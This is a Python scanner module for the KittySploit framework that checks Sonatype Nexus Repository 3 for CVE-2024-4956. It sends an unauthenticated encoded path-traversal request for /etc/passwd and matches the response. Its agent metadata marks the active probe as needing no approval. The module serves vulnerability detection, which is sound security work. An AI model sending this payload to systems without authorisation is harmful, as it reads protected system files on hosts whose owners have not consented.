#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Path Traversal in Sonatype Nexus Repository 3 allows an unauthenticated attacker to read system files."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sonatype Nexus Repository Manager 3 - Local File Inclusion Detection',
        'description': 'Path Traversal in Sonatype Nexus Repository 3 allows an unauthenticated attacker to read system files. Fixed in version 3.68.1.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'nexus', 'lfi', 'sonatype', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://x.com/phithon_xg/status/1793517567560335428?s=46&t=GMMfJwV8rhJHdcj2TUympg',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-4956',
            'https://support.sonatype.com/hc/en-us/articles/29416509323923',
            'https://github.com/fkie-cad/nvd-json-data-feeds',
        ],
        'cve': 'CVE-2024-4956',
    }

    def run(self):
        path = '/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason='Sonatype Nexus Repository Manager 3 - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

